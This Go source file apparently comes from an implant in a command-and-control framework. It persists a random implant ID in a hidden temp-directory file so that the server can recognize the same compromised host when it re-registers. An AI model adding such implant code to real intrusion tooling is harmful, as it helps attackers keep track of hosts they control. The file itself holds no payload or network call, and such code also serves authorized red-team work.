package implant

import (
	"crypto/rand"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
)

// identityPath returns the path used to persist the stable implant ID.
func identityPath() string {
	return filepath.Join(os.TempDir(), ".ph-implant.id")
}

// ImplantID returns the stable implant identifier for this host, creating and
// persisting one on first use. The server uses it to deduplicate
// re-registrations of the same implant without trusting hostname/username.
func ImplantID() string {
	path := identityPath()
	if data, err := os.ReadFile(path); err == nil {
		if id := strings.TrimSpace(string(data)); id != "" {
			return id
		}
	}
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return ""
	}
	id := hex.EncodeToString(b)
	_ = os.WriteFile(path, []byte(id), 0600)
	return id
}
